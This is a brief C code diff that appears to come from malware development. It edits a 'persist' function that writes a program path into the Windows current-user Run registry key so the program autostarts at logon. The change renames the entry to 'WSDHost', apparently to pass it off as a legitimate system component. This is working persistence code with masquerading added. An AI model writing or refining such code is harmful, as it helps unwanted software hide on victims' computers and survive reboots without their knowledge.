@@ -3,7 +3,7 @@
 
 void persist(const char *path) {
     HKEY k;
-    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &k);
-    RegSetValueExA(k, "WinSnv", 0, REG_SZ, (BYTE*)path, lstrlenA(path) + 1);
+    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &k);
+    RegSetValueExA(k, "WSDHost", 0, REG_SZ, (BYTE*)path, lstrlenA(path) + 1);
     RegCloseKey(k);
 }
